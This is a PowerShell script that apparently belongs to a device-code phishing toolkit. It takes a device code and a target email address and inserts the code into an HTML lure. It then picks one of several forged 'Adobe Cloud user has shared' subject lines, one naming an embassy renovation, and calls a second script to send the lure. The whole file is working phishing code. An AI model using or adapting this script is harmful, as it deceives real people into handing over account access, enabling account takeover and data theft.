[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$code,
    [Parameter(Mandatory=$false)]
    [string]$subject,
    [Parameter(Mandatory=$false)]
    [string]$firstUser
)

if(!($code)){ $code = Read-Host "Enter Device code from PhirstPhish step" }
if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}
.\Replace.ps1 -code $code
$messageContent2 = Get-Content bluebeam.htm -Raw

$subjects = @(
    "A Adobe Cloud user has shared 'Upcoming Downtown Construction Project: Key Details and Timeline' with you.",
    "A Adobe Cloud user has shared 'Invitation: Stakeholder Meeting on Downtown Development Plans' with you.",
    "A Adobe Cloud user has shared 'Progress Update: Downtown Construction and Urban Development' with you.",
    "A Adobe Cloud user has shared 'Embassy Renovation Supplemental Instruction Plan and General Guidelines' with you."
)

if(!($subject)){ $subject = $subject = Get-Random -InputObject $subjects} 
.\Second.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject